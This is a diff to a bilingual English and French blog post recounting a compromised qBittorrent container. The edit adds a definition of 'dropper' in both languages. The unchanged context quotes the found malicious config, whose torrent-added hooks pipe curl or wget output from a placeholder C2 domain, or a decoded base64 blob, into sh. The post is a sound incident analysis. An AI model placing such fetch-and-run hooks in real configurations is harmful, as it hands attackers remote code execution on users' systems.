@@ -25,7 +25,7 @@ OnTorrentAdded\\Enabled=true
 OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
 enabled=true
 program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
-<p>Every torrent added → arbitrary remote code, executed inside the qBit container, with the qBit user's privileges and access to every bind mount and the VPN namespace. The C2 was alive. Last-modified on the dropper: two days before I found it. Caddy was happily serving the payload.</p>
+<p>Every torrent added → arbitrary remote code, executed inside the qBit container, with the qBit user's privileges and access to every bind mount and the VPN namespace. The C2 was alive. The <em>dropper</em> — the small first-stage script whose only job is to fetch and execute the real payload — had a last-modified two days before I found it. Caddy was happily serving it.</p>
 <p>I stopped the container.</p>
 
 <h2>The flaw is not qBittorrent. The flaw is the model.</h2>
@@ -154,7 +154,7 @@ OnTorrentAdded\\Enabled=true
 OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
 enabled=true
 program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
-<p>Chaque torrent ajouté → exécution de code distant arbitraire, à l'intérieur du conteneur qBit, avec les privilèges de l'utilisateur qBit et l'accès à chaque bind mount et au namespace VPN. Le C2 était vivant. Last-modified sur le dropper : deux jours avant que je le trouve. Caddy servait le payload tranquillement.</p>
+<p>Chaque torrent ajouté → exécution de code distant arbitraire, à l'intérieur du conteneur qBit, avec les privilèges de l'utilisateur qBit et l'accès à chaque bind mount et au namespace VPN. Le C2 était vivant. Le <em>dropper</em> — le petit script de première étape dont le seul rôle est de récupérer et d'exécuter la vraie charge utile — avait un last-modified à deux jours avant que je le trouve. Caddy le servait tranquillement.</p>
 <p>J'ai stoppé le conteneur.</p>
 
 <h2>Le défaut n'est pas dans qBittorrent. Il est dans le modèle.</h2>
